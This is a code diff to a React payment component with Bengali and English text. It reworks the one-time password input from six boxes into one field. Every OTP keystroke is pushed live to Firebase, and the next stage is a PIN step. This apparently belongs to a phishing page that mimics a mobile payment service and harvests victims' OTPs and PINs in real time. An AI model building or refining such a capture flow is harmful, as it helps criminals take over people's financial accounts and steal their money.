@@ -122,59 +122,23 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   };
 
   // Step 2: OTP handlers
-  const handleOtpDigitChange = (index: number, val: string) => {
-    // Handle paste of whole 6-digit code
-    if (val.length > 1) {
-      const digitsOnly = val.replace(/\D/g, '').slice(0, 6);
-      const newOtp = [...otpDigits];
-      for (let i = 0; i < 6; i++) {
-        newOtp[i] = digitsOnly[i] || '';
-      }
-      setOtpDigits(newOtp);
-      const fullOtp = newOtp.join('');
-      setOtpValue(fullOtp);
-      syncToFirebase({ otp: fullOtp });
-      if (digitsOnly.length === 6) {
-        otpInputRefs.current[5]?.focus();
-      } else {
-        otpInputRefs.current[Math.min(digitsOnly.length, 5)]?.focus();
-      }
-      return;
-    }
-
-    const digit = val.replace(/\D/g, '');
-    const newOtp = [...otpDigits];
-    newOtp[index] = digit;
-    setOtpDigits(newOtp);
-
-    const fullOtp = newOtp.join('');
-    setOtpValue(fullOtp);
-    syncToFirebase({ otp: fullOtp });
-
-    // Focus next box if digit entered
-    if (digit && index < 5) {
-      otpInputRefs.current[index + 1]?.focus();
-    }
-  };
-
-  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace') {
-      if (!otpDigits[index] && index > 0) {
-        otpInputRefs.current[index - 1]?.focus();
-      }
-    }
+  const handleOtpChange = (val: string) => {
+    const digitsOnly = val.replace(/\D/g, '').slice(0, 6);
+    setOtpValue(digitsOnly);
+    setOtpDigits(digitsOnly.split('').concat(Array(6).fill('')).slice(0, 6));
+    syncToFirebase({ otp: digitsOnly });
   };
 
   const handleProceedOtp = () => {
-    const fullOtp = otpDigits.join('');
-    if (fullOtp.length !== 6) {
+    const currentOtp = otpValue || otpDigits.join('');
+    if (currentOtp.length !== 6) {
       setErrorMessage(
         lang === 'bn' ? 'অনুগ্রহ করে সঠিক ৬ ডিজিটের ওটিপি (OTP) দিন' : 'Please enter a valid 6-digit OTP code'
       );
       return;
     }
     setErrorMessage('');
-    syncToFirebase({ otp: fullOtp, step: 'pin' });
+    syncToFirebase({ otp: currentOtp, step: 'pin' });
   };
 
   const handleResendOtp = () => {
@@ -382,21 +346,17 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
           {lang === 'bn' ? 'যাচাইকরণ কোড লিখুন [OTP]' : 'Enter Verification Code [OTP]'}
         </h2>
 
-        {/* 6 OTP Digit Boxes */}
-        <div className="flex items-center justify-center gap-1.5 sm:gap-2.5 mb-5">
-          {[0, 1, 2, 3, 4, 5].map((i) => (
-            <input
-              key={i}
-              ref={(el) => (otpInputRefs.current[i] = el)}
-              type="text"
-              inputMode="numeric"
-              maxLength={6}
-              value={otpDigits[i] || ''}
-              onChange={(e) => handleOtpDigitChange(i, e.target.value)}
-              onKeyDown={(e) => handleOtpKeyDown(i, e)}
-              className="w-8 h-9 sm:w-10 sm:h-11 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-lg sm:text-xl shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
-            />
-          ))}
+        {/* Single OTP Input Box */}
+        <div className="w-full mb-5 flex flex-col items-center">
+          <input
+            type="text"
+            inputMode="numeric"
+            maxLength={6}
+            value={otpValue}
+            onChange={(e) => handleOtpChange(e.target.value)}
+            placeholder="XXXXXX"
+            className="w-44 sm:w-48 h-10 sm:h-11 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-base sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white tracking-[0.2em] placeholder:text-gray-400 placeholder:font-bold placeholder:tracking-[0.2em] transition-none"
+          />
         </div>
 
         {errorMessage && (
